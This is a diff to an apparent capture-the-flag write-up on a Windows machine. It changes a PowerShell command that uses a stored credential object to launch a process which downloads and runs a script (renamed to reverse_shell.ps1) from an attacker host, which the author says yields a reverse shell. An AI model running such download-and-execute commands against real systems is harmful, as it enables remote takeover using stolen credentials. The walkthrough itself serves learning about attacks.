@@ -39,7 +39,7 @@ PS C:\Users\svc_minecraft\server\plugins> $cred = New-Object System.Management.A
 
 # after that the last part will be using this object to get a shell
 ```
-PS C:\Users\svc_minecraft\server\plugins> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8080/a.ps1')" -Credential $cred
+PS C:\Users\svc_minecraft\server\plugins> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8080/reverse_shell.ps1')" -Credential $cred
 ```
 what we have done so above is that we  have initilize the process that will execute the download a powershell script from our machine and execute it and we get a reverse shell
 
